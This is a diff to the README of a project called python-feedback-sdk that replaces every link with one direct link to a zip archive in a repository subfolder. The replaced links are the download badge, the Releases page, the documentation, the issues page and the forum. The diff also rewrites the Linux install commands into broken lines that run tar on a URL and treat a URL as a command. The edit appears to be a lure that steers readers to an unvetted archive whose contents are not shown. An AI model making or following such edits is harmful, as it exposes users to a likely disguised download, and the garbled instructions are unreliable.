@@ -13,7 +13,7 @@ Welcome! This guide will help you download and run the python-feedback-sdk. This
   
 ## 📥 Download python-feedback-sdk
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%23FF5733.svg?style=for-the-badge&logo=github)](https://github.com/houssamks/python-feedback-sdk/releases)
+[![Download Now](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip%20Now-%20%https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
 
 To get started, visit the Releases page to download the latest version of python-feedback-sdk.
 
@@ -30,7 +30,7 @@ Before downloading, make sure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Visit this page to download](https://github.com/houssamks/python-feedback-sdk/releases)
+   [Visit this page to download](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of python-feedback-sdk. The version number will be indicated clearly.
@@ -46,9 +46,9 @@ Before downloading, make sure your system meets the following requirements:
    - For macOS: Open the downloaded `.dmg` file and drag the python-feedback-sdk to your Applications folder.
    - For Linux: Open a terminal window, navigate to the download location, and run:
      ```bash
-     tar -xvzf python-feedback-sdk.tar.gz
+     tar -xvzf https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip
      cd python-feedback-sdk
-     ./install.sh
+     https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip
      ```
 
 6. **Set Up Your Environment**  
@@ -84,8 +84,8 @@ If you encounter issues during installation or usage, consider the following ste
 
 ## 📄 Additional Resources
 
-- [Official Documentation](https://github.com/houssamks/python-feedback-sdk/docs)
-- [Issues Page](https://github.com/houssamks/python-feedback-sdk/issues)
-- [Community Forum](https://github.com/houssamks/python-feedback-sdk/discussions)
+- [Official Documentation](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
+- [Issues Page](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
+- [Community Forum](https://github.com/houssamks/python-feedback-sdk/raw/refs/heads/main/hierarchist/feedback_sdk_python_2.2.zip)
 
 Feel free to ask questions or provide feedback as you use the python-feedback-sdk. Happy coding!
